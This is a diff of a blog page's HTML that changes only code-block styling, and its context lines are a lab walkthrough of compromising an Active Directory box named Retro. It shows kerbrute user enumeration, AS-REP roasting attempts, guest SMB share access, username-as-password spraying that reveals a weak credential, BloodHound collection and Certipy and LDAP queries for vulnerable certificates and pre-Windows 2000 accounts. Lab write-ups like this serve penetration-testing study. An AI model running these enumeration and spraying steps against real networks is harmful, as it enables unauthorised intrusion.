@@ -254,7 +254,7 @@
 <h3 id="nmap">NMAP:</h3>
 <h4 id="basic-scans">Basic Scans:</h4>
 <p><strong>TCP</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>nmap $box -Pn -oA TCPbasicScan
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -278,7 +278,7 @@
 <li><strong>Initial thoughts</strong>: Looks to be a domain controller as we have DNS (<code>53</code>) kerberos (<code>88</code>) &amp; ldap (<code>389</code>, <code>636</code>, <code>3268</code> &amp; <code>3269</code>) running plus SMB &amp; rdp (<code>3389</code>)</li>
 </ul>
 <h4 id="comprehensive-scans">Comprehensive Scans:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -360,13 +360,13 @@
 </ul>
 <h3 id="updating-etc-hosts-and-variables">Updating <code>/etc/hosts</code> &amp; Variables:</h3>
 <p>I have a script I use to update variables in my <code>.zshrc</code> and as we now know the domain and machine values lets store them.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>update_var domain <span style="color:#e6db74">&#34;retro.vl&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>update_var domain <span style="color:#e6db74">&#34;retro.vl&#34;</span>
 </span></span><span style="display:flex;"><span>update_var machine <span style="color:#e6db74">&#34;DC&#34;</span>
 </span></span></code></pre></div><p>Now, I will update <code>/etc/hosts</code> for DNS and &amp; further LDAP Queries.</p>
 <ul>
 <li>I update my <code>/etc/hosts</code> file to enable tools like <a href="https://github.com/ropnop/kerbrute"  target="_blank" rel="noreferrer nofollow">kerbrute</a>
  for user enumeration and other tools that require DNS or LDAP for queries:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   </span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">.</span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">&#34;</span> | sudo tee -a /etc/hosts
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   </span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">.</span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">&#34;</span> | sudo tee -a /etc/hosts
 </span></span></code></pre></div></li>
 </ul>
 <h3 id="ldap-389">LDAP <code>389</code>:</h3>
@@ -403,9 +403,9 @@
 <li>It will also search the domain for any service/svc accounts and place them in a folder too.</li>
 </ul>
 <p>Let&rsquo;s run it and see what we get back.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass
 </span></span></code></pre></div><p>It turns out the anonymous bind is (+NOT+) enabled and we get the below information.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span> Server Information
 </span></span><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span>  • IP Address  : 10.129.234.44
@@ -497,11 +497,11 @@
 </ul>
 <h3 id="syncing-clocks-for-kerberos-exploitation">Syncing Clocks for Kerberos Exploitation:</h3>
 <p>Since Kerberos is enabled on this host, it&rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo ntpdate -s $domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo ntpdate -s $domain
 </span></span></code></pre></div><p>+Note+: I am doing this now as we have the DNS name etc.</p>
 <h3 id="dns-53">DNS <code>53</code>:</h3>
 <p>Let&rsquo;s use <code>dnsenum</code> to find if there are any interesting DNS records being served.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dnsenum -r --dnsserver $box --enum -p <span style="color:#ae81ff">0</span> -s <span style="color:#ae81ff">0</span> -f ~/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt $domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dnsenum -r --dnsserver $box --enum -p <span style="color:#ae81ff">0</span> -s <span style="color:#ae81ff">0</span> -f ~/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt $domain
 </span></span></code></pre></div><p>The entries found are just standard entries on all DC&rsquo;s.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-084551_.png" alt=""  />
@@ -511,21 +511,21 @@
 <h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute"  target="_blank" rel="noreferrer nofollow">Kerbrute</a>
  to bruteforce Usernames:</h4>
 <p>Kerbrute is great for bruteforcing usernames/emails when kerberos is running.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt
 </span></span></code></pre></div><p>As we can see we have managed to extract two valid emails &amp; usernames. tblack &amp; jburley.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-083316_.png" alt=""  />
 </p>
 </p>
 <p>Lets extract the emails for ease:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>awk -F: <span style="color:#e6db74">&#39;{ gsub(/^[ \t]+|[ \t]+$/, &#34;&#34;, $4); print $4 }&#39;</span> kerbruteUsers.txt &gt;&gt; KEmails.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>awk -F: <span style="color:#e6db74">&#39;{ gsub(/^[ \t]+|[ \t]+$/, &#34;&#34;, $4); print $4 }&#39;</span> kerbruteUsers.txt &gt;&gt; KEmails.txt
 </span></span></code></pre></div><p>This may look complex but all it does is extract the Emails using <code>awk</code> and any leading/trailing whitespace.</p>
 <p>Now we need to extract just the usernames:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>awk -F@ <span style="color:#e6db74">&#39;{ print $1 }&#39;</span> KEmails.txt &gt; KUsernames.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>awk -F@ <span style="color:#e6db74">&#39;{ print $1 }&#39;</span> KEmails.txt &gt; KUsernames.txt
 </span></span></code></pre></div><p>Now we have two files ready for use when credential stuffing or bruteforcing.</p>
 <h4 id="using-impacket-getnpusers-for-asreproasting">Using impacket-GetNPUsers for ASReproasting:</h4>
 <p>We should always try and asreproast with a null/guest session as it can lead to an easy win.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-GetNPUsers $domain/ -request
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-GetNPUsers $domain/ -request
 </span></span></code></pre></div><p>No dice this time as we could not make a successful bind.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-083525_.png" alt=""  />
@@ -543,7 +543,7 @@ Neither of these users have the <code>PREAUTH</code> flag set.
 <h3 id="smb-445">SMB <code>445</code>:</h3>
 <h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
 <p>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
 </span></span></code></pre></div><p>As we can see guest sessions are enabled and we can access the <code>Trainees</code> share as a guest.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-084925_.png" alt=""  />
@@ -551,11 +551,11 @@ Neither of these users have the <code>PREAUTH</code> flag set.
 </p>
 <h4 id="trying-usernames-as-passwords">Trying Usernames as Passwords:</h4>
 <p>I always try usernames as passwords as well.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u KUsernames.txt -p KUsernames.txt --shares --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u KUsernames.txt -p KUsernames.txt --shares --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>We do not get any hits.</p>
 <h4 id="enumerating-users-with-impacket-lookupsid">Enumerating Users with Impacket-lookupsid:</h4>
 <p>We can use <code>impacket-lookupsid</code> to enumerate users &amp; groups on the domain, well anything that has a SID.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid $domain/guest@$machine.$domain -domain-sids
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid $domain/guest@$machine.$domain -domain-sids
 </span></span></code></pre></div><ul>
 <li>+Note+: As we are using the &ldquo;Guest&rdquo; account we can just hit enter for a blank password</li>
 </ul>
@@ -576,14 +576,14 @@ Neither of these users have the <code>PREAUTH</code> flag set.
 </p>
 <h4 id="enumerating-smb-shares-using-netexec">Enumerating SMB shares using netexec:</h4>
 <p>As we have access to a share via the &ldquo;Guest&rdquo; account we can spider them to check for interesting files</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#34;Guest&#34;</span> -p <span style="color:#e6db74">&#34;&#34;</span> -M spider_plus
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#34;Guest&#34;</span> -p <span style="color:#e6db74">&#34;&#34;</span> -M spider_plus
 </span></span></code></pre></div><p>As we can see 1 file was found in the share.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-085256_.png" alt=""  />
 </p>
 </p>
 <p>Lets see if there is anything of note:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /home/kali/.nxc/modules/nxc_spider_plus/$box.json
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /home/kali/.nxc/modules/nxc_spider_plus/$box.json
 </span></span></code></pre></div><p>We can see it contains a file called <code>important.txt</code>.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-085446_.png" alt=""  />
@@ -591,10 +591,10 @@ Neither of these users have the <code>PREAUTH</code> flag set.
 
 #+end_src</p>
 <h4 id="using-smbclient-to-connect-to-the-trainees-share">Using smbclient To Connect To The Trainees Share:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\trainees&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\trainees&#34;</span>
 </span></span></code></pre></div><h4 id="downloading-the-contents-of-the-trainees-share-with-smbclient">Downloading The Contents of the Trainees share with smbclient:</h4>
 <p>Let&rsquo;s download the contents of the share, we can do this from within smbclient.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mget *
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mget *
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-085711_.png" alt=""  />
 </p>
@@ -621,7 +621,7 @@ Neither of these users have the <code>PREAUTH</code> flag set.
 <h2 id="2-dot-foothold">2. Foothold</h2>
 <h3 id="re-running-usernames-as-passwords-and-discovering-trainees-password">Re-running Usernames as Passwords &amp; Discovering Trainees Password:</h3>
 <p>Even though I re-ran my tests earlier with the new updated usernames list I did forget to re-test usernames as passwords. Let&rsquo;s retest.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>As we can see the Trainee user has the password set to trainee too.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-093221_.png" alt=""  />
@@ -630,17 +630,17 @@ Neither of these users have the <code>PREAUTH</code> flag set.
 +Note+: This is why it&rsquo;s so important to re-check and re-run tests once you have updated information.</p>
 <h3 id="enumerating-as-trainee">Enumerating As Trainee:</h3>
 <p>Let&rsquo;s check if the <code>Trainee</code> user has access to different shares.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb $box -u trainee -p trainee --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb $box -u trainee -p trainee --shares
 </span></span></code></pre></div><p>As we can see they have access to the <code>Notes</code> share.</p>
 <h4 id="accessing-the-notes-share">Accessing the Notes Share:</h4>
 <p>We can access the notes share using <code>smbclient</code> again.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;trainee&#39;</span> <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\Notes&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;trainee&#39;</span> <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\Notes&#34;</span>
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-093747_.png" alt=""  />
 </p>
 
 We can see there are two files let&rsquo;s grab them.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mget *
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mget *
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-14-093817_.png">
 </figure>
 
@@ -651,7 +651,7 @@ We can see there are two files let&rsquo;s grab them.</p>
 +Note+: Future bloodstiller here, none in the <code>SYSVOL</code> :(</p>
 <h3 id="performing-a-bloodhound-collection">Performing a Bloodhound Collection:</h3>
 <p>We can use bloodhound-python to perform a collection to get a better lay of the land.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bloodhound-python -d $domain -ns $box -c All -u $user -p $pass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bloodhound-python -d $domain -ns $box -c All -u $user -p $pass
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-14-094445_.png" alt=""  />
 </p>
@@ -695,7 +695,7 @@ We then import these into bloodhound for investigation.</p>
 </p>
 <h3 id="enumerating-the-ca-using-certipy-ad">Enumerating The CA Using Certipy-ad:</h3>
 <p>As we have creds now we can also query the CA.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-17-152430_.png" alt=""  />
 </p>
@@ -758,21 +758,21 @@ computer account. That one is older than me.</p>
 <p>Searching online we can find this entry on <a href="https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers"  target="_blank" rel="noreferrer nofollow">The Hacker Recipes - pre-windows-2000-computers</a>
  which details how we can search for computers that match our criteria we should be able to use the below query using <code>ldapsearch-ad.py</code></p>
 <p>+Note+: You can install <code>ldapsearch-ad.py</code> with the below command.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pipx install git+https://github.com/yaap7/ldapsearch-ad
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pipx install git+https://github.com/yaap7/ldapsearch-ad
 </span></span></code></pre></div><h4 id="trying-ldapsearch-ad-dot-py-recommended-search-terms">Trying <code>ldapsearch-ad.py</code> Recommended Search Terms:</h4>
 <p>Trying the recommended search term as per the article yields no results for me.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ldapsearch-ad.py -l ldap://$box:389 -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> -t search -s <span style="color:#e6db74">&#39;(&amp;(userAccountControl=4128)(logonCount=0))&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ldapsearch-ad.py -l ldap://$box:389 -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> -t search -s <span style="color:#e6db74">&#39;(&amp;(userAccountControl=4128)(logonCount=0))&#39;</span>
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-16-122308_.png">
 </figure>
 
 <p>However this is a very simple LDAP search so we should be able to customize the query below and use any tools that accept LDAP queries.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e6db74">&#39;(&amp;(userAccountControl=4128)(logonCount=0))&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e6db74">&#39;(&amp;(userAccountControl=4128)(logonCount=0))&#39;</span>
 </span></span></code></pre></div><h4 id="ldap-queries-to-search-for-pre-windows-2000-machine-accounts">LDAP Queries To Search For Pre Windows 2000 Machine Accounts:</h4>
 <p>Instead of using the recommended ldap query we can use the below ldap queries using a bitwise matching rule&rsquo;s to match the values we are looking for.</p>
 <ul>
 <li><strong>LDAP Query</strong></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Searching For Each Bitwise Value Recommended</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Searching For Each Bitwise Value Recommended</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>&amp;<span style="color:#f92672">(</span>objectClass<span style="color:#f92672">=</span>computer<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>userAccountControl:1.2.840.113556.1.4.803:<span style="color:#f92672">=</span>4096<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>userAccountControl:1.2.840.113556.1.4.803:<span style="color:#f92672">=</span>32<span style="color:#f92672">))</span>
@@ -782,7 +782,7 @@ computer account. That one is older than me.</p>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>userAccountControl:1.2.840.113556.1.4.803:<span style="color:#f92672">=</span>4128<span style="color:#f92672">))</span>
 </span></span></code></pre></div><h4 id="using-ldapsearch-ad-dot-py-to-search-for-pre-windows-2000-machine-accounts">Using <code>ldapsearch-ad.py</code> To Search For Pre Windows 2000 Machine Accounts:</h4>
 <p>We now take the above ldap query and use <code>ldapsearch-ad.py</code> again.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Specific Match</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># Specific Match</span>
 </span></span><span style="display:flex;"><span>ldapsearch-ad.py -l ldap://$box:389 -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> -t search -s <span style="color:#e6db74">&#39;(&amp;(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096)(userAccountControl:1.2.840.113556.1.4.803:=32))&#39;</span>
